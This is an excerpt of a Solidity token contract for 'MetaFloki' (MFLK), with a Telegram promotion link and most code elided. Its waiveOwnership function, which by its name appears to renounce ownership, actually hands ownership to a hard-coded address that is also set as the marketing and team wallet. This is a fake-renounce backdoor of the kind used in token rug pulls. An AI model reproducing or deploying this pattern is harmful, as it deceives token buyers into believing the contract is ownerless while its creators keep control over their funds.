...
/**
Telegram : https://t.me/MetaFlokiPortal
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xdD09DDC94ec5aeE0396B8083BB40D74968794373);
    }
...
contract MetaFloki is Context, IERC20, Ownable {
    ...
    string private _symbol = "MFLK";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xdD09DDC94ec5aeE0396B8083BB40D74968794373);
    address payable private teamWalletAddress = payable(0xdD09DDC94ec5aeE0396B8083BB40D74968794373);
